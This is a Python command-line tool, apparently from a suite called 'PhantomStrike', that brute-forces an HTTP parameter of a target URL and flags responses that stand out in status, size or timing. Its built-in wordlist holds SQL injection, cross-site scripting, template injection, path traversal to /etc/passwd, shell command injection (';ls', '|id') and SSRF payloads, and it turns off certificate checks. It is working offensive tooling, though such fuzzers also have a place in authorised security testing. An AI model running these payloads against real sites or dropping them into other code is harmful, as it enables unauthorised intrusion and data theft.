#!/usr/bin/env python3
"""HTTP parameter brute-forcer: test param values from wordlist, detect anomalies."""
import argparse
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_WORDLIST = [
    "admin", "test", "1", "0", "-1", "true", "false", "null", "none", "undefined",
    "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1'--", "<script>alert(1)</script>",
    "{{7*7}}", "${7*7}", "../../../etc/passwd", "%00", "%0a", "%0d%0a",
    "127.0.0.1", "localhost", "0x7f000001", ";ls", "|id", "`id`",
    "admin' --", "1 UNION SELECT NULL--", "1; SELECT * FROM users--",
    "-1 OR 1=1", "1 AND 1=2", "' AND '1'='2", "AAAA%n%n%n%n",
    "file:///etc/passwd", "http://127.0.0.1", "javascript:alert(1)",
    "a][@", "<!--", "]]>", "<![CDATA[test]]>", "%s%s%s%s%s", "{0}", "NaN",
    "99999999", "-99999999", "0.0", "1e309", "Array", "Object",
]


def load_wordlist(path):
    try:
        with open(path, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Cannot load wordlist: {e}", file=sys.stderr)
        sys.exit(1)


def get_baseline(session, url, params, target_param, timeout):
    test_params = dict(params)
    try:
        resp = session.get(url, params=test_params, timeout=timeout, verify=False, allow_redirects=True)
        return {"status": resp.status_code, "length": len(resp.content), "time": resp.elapsed.total_seconds(),
                "headers": dict(resp.headers)}
    except Exception:
        return None


def is_anomaly(baseline, status, length, elapsed, threshold):
    if baseline is None:
        return False, []
    reasons = []
    if status != baseline["status"]:
        reasons.append(f"status:{baseline['status']}->{status}")
    len_diff = abs(length - baseline["length"])
    if baseline["length"] > 0 and (len_diff / max(baseline["length"], 1)) > threshold:
        reasons.append(f"size:{baseline['length']}->{length} (diff:{len_diff})")
    if elapsed > baseline["time"] * 3 and elapsed > 2:
        reasons.append(f"time:{baseline['time']:.2f}s->{elapsed:.2f}s")
    return len(reasons) > 0, reasons


def main():
    ap = argparse.ArgumentParser(description="HTTP parameter brute-forcer (Intruder-lite)")
    ap.add_argument("target", help="Target URL with params (e.g., http://example.com/api?id=1)")
    ap.add_argument("-p", "--param", help="Parameter to fuzz (default: first found)")
    ap.add_argument("-w", "--wordlist", help="Path to wordlist file")
    ap.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    ap.add_argument("--threshold", type=float, default=0.1, help="Response size anomaly threshold (0.0-1.0)")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    ap.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
    ap.add_argument("--mc", help="Match status codes (comma-separated, e.g., 200,302)")
    ap.add_argument("--ms", type=int, help="Match response size")
    args = ap.parse_args()

    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    parsed = urlparse(target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    if not params and not args.param:
        print("[!] No URL parameters found. Specify -p to add a parameter.", file=sys.stderr)
        sys.exit(1)

    target_param = args.param or list(params.keys())[0]
    if target_param not in params:
        params[target_param] = ""

    wordlist = load_wordlist(args.wordlist) if args.wordlist else DEFAULT_WORDLIST
    match_codes = [int(c) for c in args.mc.split(",")] if args.mc else None

    session = requests.Session()
    session.headers["User-Agent"] = "PhantomStrike/1.0 HTTPIntruder"

    print(f"[*] HTTP Intruder - Target: {target}")
    print(f"[*] Fuzzing parameter: {target_param}")
    print(f"[*] Wordlist: {len(wordlist)} payloads | Method: {args.method}")
    print(f"[*] Anomaly threshold: {args.threshold}\n")

    print("[*] Getting baseline response...")
    baseline = get_baseline(session, base_url, params, target_param, args.timeout)
    if baseline:
        print(f"  Baseline: status={baseline['status']}, size={baseline['length']}, time={baseline['time']:.2f}s\n")
    else:
        print("  [!] Could not get baseline response\n")

    print(f"  {'#':<6} {'STATUS':<8} {'SIZE':<10} {'TIME':<10} {'PAYLOAD':<30} {'FLAGS'}")
    print(f"  {'-'*6} {'-'*8} {'-'*10} {'-'*10} {'-'*30} {'-'*20}")

    anomalies = []
    for i, payload in enumerate(wordlist, 1):
        test_params = dict(params)
        test_params[target_param] = payload
        try:
            if args.method == "POST":
                resp = session.post(base_url, data=test_params, timeout=args.timeout, verify=False, allow_redirects=True)
            else:
                resp = session.get(base_url, params=test_params, timeout=args.timeout, verify=False, allow_redirects=True)
            status = resp.status_code
            length = len(resp.content)
            elapsed = resp.elapsed.total_seconds()
            is_anom, reasons = is_anomaly(baseline, status, length, elapsed, args.threshold)

            show = is_anom
            if match_codes and status in match_codes:
                show = True
            if args.ms is not None and length == args.ms:
                show = True

            flag_str = ", ".join(reasons) if reasons else ""
            if show:
                marker = " <-- ANOMALY" if is_anom else ""
                print(f"  {i:<6} {status:<8} {length:<10} {elapsed:<10.3f} {payload[:30]:<30} {flag_str}{marker}")
                anomalies.append({"index": i, "payload": payload, "status": status, "size": length,
                                  "time": elapsed, "reasons": reasons})
        except Exception as e:
            print(f"  {i:<6} {'ERR':<8} {'---':<10} {'---':<10} {payload[:30]:<30} {str(e)[:30]}")

        if args.delay > 0:
            time.sleep(args.delay)

    print(f"\n{'='*60}")
    print(f"[*] RESULTS SUMMARY")
    print(f"{'='*60}\n")
    print(f"  Total requests:  {len(wordlist)}")
    print(f"  Anomalies found: {len(anomalies)}\n")

    if anomalies:
        print("  Interesting payloads:")
        for a in anomalies:
            print(f"    [{a['status']}] {a['payload'][:50]} (size={a['size']}, time={a['time']:.2f}s)")
            if a["reasons"]:
                print(f"         Reasons: {', '.join(a['reasons'])}")
    else:
        print("  [OK] No anomalies detected")


if __name__ == "__main__":
    main()
